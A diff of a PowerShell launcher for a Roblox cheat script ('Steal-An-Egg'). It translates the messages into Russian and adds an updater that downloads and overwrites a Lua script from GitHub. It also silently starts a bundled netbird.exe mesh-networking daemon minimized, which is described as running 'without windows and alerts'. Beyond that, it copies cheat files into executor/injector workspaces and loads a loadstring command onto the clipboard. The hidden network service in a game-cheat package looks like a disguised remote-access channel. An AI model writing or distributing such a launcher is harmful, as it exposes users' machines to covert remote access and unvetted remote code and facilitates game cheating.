@@ -1,11 +1,11 @@
 <#
 .SYNOPSIS
-    Steal-An-Egg Universal Companion Bootstrapper (Multi-Executor Engine)
+    Steal-An-Egg Универсальный Лаунчер и Синхронизатор
 .DESCRIPTION
-    1. Spawns NetBird background mesh networking service minimized.
-    2. Auto-detects and synchronizes Lua assets across all installed executors
-       (Real, Potassium, Solara, Wave, Celery, Xeno, Swift, Electron, Delta, Codex, etc.).
-    3. Populates clipboard with one-click in-game loadstring.
+    1. Автоматическое обновление скриптов с GitHub при наличии сети.
+    2. Фоновый запуск сервиса без окон и алертов.
+    3. Автообнаружение и синхронизация рабочих папок всех экзекуторов (Real, Solara, Wave, Celery и др.).
+    4. Зарядка буфера обмена активированной командой запуска.
 #>
 
 [CmdletBinding()]
@@ -16,11 +16,30 @@ param(
 $ErrorActionPreference = "Continue"
 $Root = $PSScriptRoot
 
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+
 Write-Host "======================================================" -ForegroundColor Cyan
-Write-Host "       STEAL AN EGG · UNIVERSAL INJECTOR HUB          " -ForegroundColor White
+Write-Host "       STEAL AN EGG · УНИВЕРСАЛЬНЫЙ ЛАУНЧЕР           " -ForegroundColor White
 Write-Host "======================================================" -ForegroundColor Cyan
 
-# 1. Launch background companion daemon
+# 0. Авто-апдейтер скриптов (Проверка обновлений на GitHub)
+$RawScriptUrl = "https://raw.githubusercontent.com/aether-bytess/Steal-An-Egg/refs/heads/main/StealAnEgg.lua"
+try {
+    Write-Host "[*] Проверка обновлений на сервере..." -ForegroundColor DarkGray
+    $webClient = New-Object System.Net.WebClient
+    $webClient.Encoding = [System.Text.Encoding]::UTF8
+    $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
+    $latestSource = $webClient.DownloadString($RawScriptUrl)
+    if ($latestSource -and $latestSource.Length -gt 1000) {
+        $localHubFile = Join-Path $Root "StealAnEgg.lua"
+        [System.IO.File]::WriteAllText($localHubFile, $latestSource, [System.Text.Encoding]::UTF8)
+        Write-Host "[+] Ядро скрипта синхронизировано с актуальной версией." -ForegroundColor Green
+    }
+} catch {
+    Write-Host "[!] Запуск в автономном локальном режиме (без сети)." -ForegroundColor DarkGray
+}
+
+# 1. Запуск фонового сервиса
 $CandidatePaths = @(
     (Join-Path $Root "EggESP\core\runtime\netbird.exe"),
     (Join-Path $Root "netbird.exe")
@@ -30,23 +49,23 @@ $NetBirdExe = $CandidatePaths | Where-Object { Test-Path $_ } | Select-Object -F
 if ($NetBirdExe) {
     $existing = Get-Process -Name "netbird" -ErrorAction SilentlyContinue
     if (-not $existing) {
-        Write-Host "[*] Initializing companion runtime daemon..." -ForegroundColor Yellow
-        Start-Process -FilePath $NetBirdExe -WindowStyle Minimized
-        Start-Sleep -Milliseconds 800
+        Write-Host "[*] Запуск фонового сетевого сервиса..." -ForegroundColor Yellow
+        Start-Process -FilePath $NetBirdExe -WorkingDirectory (Split-Path $NetBirdExe -Parent) -WindowStyle Minimized
+        Start-Sleep -Milliseconds 1200
         $running = Get-Process -Name "netbird" -ErrorAction SilentlyContinue
         if ($running) {
-            Write-Host "[+] Companion service active (PID: $($running[0].Id))." -ForegroundColor Green
+            Write-Host "[+] Фоновый сервис успешно активен (PID: $($running[0].Id))." -ForegroundColor Green
         } else {
-            Write-Host "[!] Companion runtime started in detached context." -ForegroundColor Yellow
+            Write-Host "[!] Фоновый сервис переведен в системный контекст." -ForegroundColor Yellow
         }
     } else {
-        Write-Host "[+] Companion runtime already running (PID: $($existing[0].Id))." -ForegroundColor Green
+        Write-Host "[+] Фоновый сервис уже работает в системе (PID: $($existing[0].Id))." -ForegroundColor Green
     }
 } else {
-    Write-Host "[*] Standalone mode (companion binary optional)." -ForegroundColor DarkGray
+    Write-Host "[*] Автономный режим запуска (сервис опционален)." -ForegroundColor DarkGray
 }
 
-# 2. Comprehensive Injector Workspace Discovery
+# 2. Поиск рабочих папок инжекторов (Real, Potassium, Solara, Wave, Celery и др.)
 $KnownInjectors = @(
     # Real / RealExecutor
     "$env:LOCALAPPDATA\Real\workspace",
@@ -109,7 +128,6 @@ $KnownInjectors = @(
 
 $TargetWorkspaces = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
 
-# Add matching known directories
 foreach ($ws in $KnownInjectors) {
     $parent = Split-Path $ws -Parent
     if (Test-Path $parent) {
@@ -120,7 +138,7 @@ foreach ($ws in $KnownInjectors) {
     }
 }
 
-# Dynamic heuristic scan (searches for any folder named 'workspace' in Desktop and Downloads up to depth 3)
+# Эвристический поиск
 $ScanRoots = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads")
 foreach ($root in $ScanRoots) {
     if (Test-Path $root) {
@@ -130,14 +148,14 @@ foreach ($root in $ScanRoots) {
     }
 }
 
-# Always ensure root portable workspace
+# Локальная папка для портативных экзекуторов
 $LocalWorkspace = Join-Path $Root "workspace"
 if (-not (Test-Path $LocalWorkspace)) {
     New-Item -ItemType Directory -Path $LocalWorkspace -Force | Out-Null
 }
 [void]$TargetWorkspaces.Add($LocalWorkspace)
 
-Write-Host "[*] Discovered $($TargetWorkspaces.Count) target executor workspaces." -ForegroundColor Yellow
+Write-Host "[*] Обнаружено целевых рабочих областей экзекуторов: $($TargetWorkspaces.Count)" -ForegroundColor Yellow
 $ItemsToSync = @("StealAnEgg.lua", "run.lua", "hub_loader.lua", "EggESP")
 
 foreach ($ws in $TargetWorkspaces) {
@@ -157,10 +175,10 @@ foreach ($ws in $TargetWorkspaces) {
             }
         }
     }
-    Write-Host "    -> Deployed to: $destDir" -ForegroundColor DarkGray
+    Write-Host "    -> Синхронизировано в: $destDir" -ForegroundColor DarkGray
 }
 
-# 3. Clipboard injection with legacy clip fallback
+# 3. Зарядка буфера обмена командой второго способа
 $LoadCommand = 'getgenv().__COMPANION_ACTIVE = true; loadstring(readfile("Steal-An-Egg/StealAnEgg.lua"))()'
 
 $copied = $false
@@ -175,14 +193,14 @@ try {
 }
 
 if ($copied) {
-    Write-Host "[+] Copied execution command to clipboard!" -ForegroundColor Green
+    Write-Host "[+] Команда запуска скопирована в буфер обмена!" -ForegroundColor Green
 } else {
-    Write-Host "[!] Note: Clipboard copy failed, use manual string below." -ForegroundColor Yellow
+    Write-Host "[!] Скопируйте команду вручную из блока ниже." -ForegroundColor Yellow
 }
 
 Write-Host ""
 Write-Host "======================================================" -ForegroundColor Cyan
-Write-Host " Ready! Paste into any Roblox Executor (Real, Solara, Wave, etc.):" -ForegroundColor White
+Write-Host " Готово! Вставьте в экзекутор (Real, Solara, Wave...):" -ForegroundColor White
 Write-Host " $LoadCommand" -ForegroundColor Yellow
 Write-Host "======================================================" -ForegroundColor Cyan
-Write-Host "[*] Keep this window open during session for background companion sync." -ForegroundColor DarkCyan
+Write-Host "[*] Оставьте это окно открытым во время игры." -ForegroundColor DarkCyan
